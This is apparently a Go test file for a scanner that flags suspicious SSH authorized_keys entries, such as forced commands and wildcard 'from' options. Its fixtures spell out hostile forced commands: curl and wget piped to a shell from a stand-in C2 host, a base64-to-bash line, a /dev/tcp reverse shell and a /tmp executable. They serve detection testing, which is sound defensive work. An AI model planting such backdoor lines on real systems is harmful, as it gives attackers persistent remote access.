package filewatch

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestInspectKeyLine(t *testing.T) {
	cases := []struct {
		name       string
		line       string
		wantReason string
	}{
		{
			name:       "normal key — no flag",
			line:       `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...rest user@laptop`,
			wantReason: "",
		},
		{
			name:       "rsync forced command — flagged as forced_command (informational)",
			line:       `command="rsync --server -vlogDtprze.iLsfxC . /backups/" ssh-rsa AAAAB...rest borg@backup`,
			wantReason: "forced_command",
		},
		{
			name:       "borg backup forced command — same",
			line:       `command="/usr/local/bin/borg-server",no-port-forwarding,no-X11-forwarding ssh-ed25519 AAAA...rest borg@backup`,
			wantReason: "forced_command",
		},
		{
			name:       "kinsing-style backdoor: command= curl|bash",
			line:       `command="curl -fsSL http://x.example/c2.sh|bash" ssh-rsa AAAA...rest attacker@evil`,
			wantReason: "forced_command_payload",
		},
		{
			name:       "wget|sh inside command",
			line:       `command="wget -qO- http://x|sh" ssh-rsa AAAA...rest x@y`,
			wantReason: "forced_command_payload",
		},
		{
			name:       "base64 inside command",
			line:       `command="echo X | base64 -d | bash" ssh-rsa AAAA...rest a@b`,
			wantReason: "forced_command_payload",
		},
		{
			name:       "dev_tcp reverse shell inside command",
			line:       `command="bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'" ssh-rsa AAAA...rest`,
			wantReason: "forced_command_payload",
		},
		{
			name:       "exec from /tmp inside command",
			line:       `command="/tmp/.x/run-me",no-port-forwarding ssh-rsa AAAA...rest`,
			wantReason: "forced_command_payload",
		},
		{
			name:       "from=*",
			line:       `from="*" ssh-rsa AAAA...rest user@laptop`,
			wantReason: "from_wildcard",
		},
		{
			name:       "from=0.0.0.0/0",
			line:       `from="0.0.0.0/0,!192.168.1.0/24" ssh-rsa AAAA...rest`,
			wantReason: "from_wildcard",
		},
		{
			name:       "restrictive options on a normal key — no flag",
			line:       `from="10.0.0.5",no-port-forwarding,no-X11-forwarding,no-pty ssh-ed25519 AAAA...rest`,
			wantReason: "",
		},
		{
			name:       "comment line — skipped",
			line:       `# ssh-rsa AAAA notes`,
			wantReason: "",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := inspectKeyLine(strings.TrimSpace(c.line))
			if got.Reason != c.wantReason {
				t.Errorf("inspectKeyLine reason = %q, want %q (line=%q)", got.Reason, c.wantReason, c.line)
			}
		})
	}
}

func TestScanAuthorizedKeys_File(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "authorized_keys")
	body := `# normal key first
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...legit user@laptop

# attacker dropped this:
command="curl -fsSL http://x.example/c2.sh|bash" ssh-rsa AAAA...evil attacker@bad
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	got := scanAuthorizedKeys(path)
	if got.Reason != "forced_command_payload" {
		t.Errorf("expected forced_command_payload, got %+v", got)
	}
	if got.Fingerprint == "" {
		t.Error("expected fingerprint")
	}
}

func TestScanAuthorizedKeys_OnlyLegitKeys(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "authorized_keys")
	body := `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...legit user@laptop
ssh-rsa AAAAB...legit2 admin@home
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	got := scanAuthorizedKeys(path)
	if got.Reason != "" {
		t.Errorf("expected empty result for clean file, got %+v", got)
	}
}

func TestScanAuthorizedKeys_MissingFile(t *testing.T) {
	if got := scanAuthorizedKeys("/nonexistent"); got.Reason != "" {
		t.Errorf("expected empty for missing file, got %+v", got)
	}
}

func TestExtractOption(t *testing.T) {
	cases := []struct {
		opts, key, want string
		ok              bool
	}{
		{`command="rsync"`, "command", "rsync", true},
		{`from="10.0.0.0/8",no-port-forwarding`, "from", "10.0.0.0/8", true},
		{`command="echo \"quoted\" inside",x=y`, "command", `echo \"quoted\" inside`, true},
		{`no-port-forwarding`, "command", "", false},
	}
	for _, c := range cases {
		got, ok := extractOption(c.opts, c.key)
		if got != c.want || ok != c.ok {
			t.Errorf("extractOption(%q, %q) = (%q, %v), want (%q, %v)", c.opts, c.key, got, ok, c.want, c.ok)
		}
	}
}
